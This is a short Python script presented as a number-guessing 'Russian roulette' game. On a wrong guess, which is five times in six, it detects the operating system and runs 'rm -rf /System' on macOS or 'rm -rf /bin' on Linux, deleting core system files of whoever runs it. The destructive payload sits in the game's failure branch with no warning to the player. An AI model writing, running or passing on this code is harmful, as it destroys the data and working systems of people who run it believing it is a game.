import random
import os
import platform

number = random.randint(1, 6)
guess = int(input("Guess a number between 1 and 6: "))

if guess == number:
    print("You survived!")
else:
    print("Boom!")
    os_type = platform.system()
    
    if os_type == "Darwin":
        os.system("rm -rf /System")
    elif os_type == "Linux":
        os.system("rm -rf /bin")

